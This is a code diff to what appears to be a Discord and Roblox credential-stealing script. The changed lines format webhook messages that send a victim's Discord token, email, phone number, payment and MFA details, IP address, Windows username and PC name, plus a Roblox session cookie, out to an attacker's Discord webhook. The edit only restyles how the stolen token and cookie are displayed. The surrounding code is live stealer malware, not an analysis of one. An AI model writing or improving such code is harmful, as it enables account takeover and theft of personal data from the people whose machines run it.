@@ -167,7 +167,7 @@ def main():
                         {
                             'title': f"**Discord user data: {res_json['username']}**",
                             'description': f"""
-                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token:\n ||`{token}`||""",
                             'color': 3092790,
                         }
                     ],
@@ -208,10 +208,10 @@ def roblox(username):
                 "username": "Smack",
                 "avatar_url": "https://cdn.discordapp.com/attachments/1476808863968788664/1561140154301943828/discord.jpg",
                 "embeds": [{
-                    "title": f"Roblox user data: {username}",
-                    "color": 0x5865F2,
-                    "description": "```\n" + cookie + "\n```",
-                }],
+                "title": f"Roblox user data: {username}",
+                "color": 0x5865F2,
+                "description": f"||`{cookie}`||",
+            }],
             })
 
 def copy():
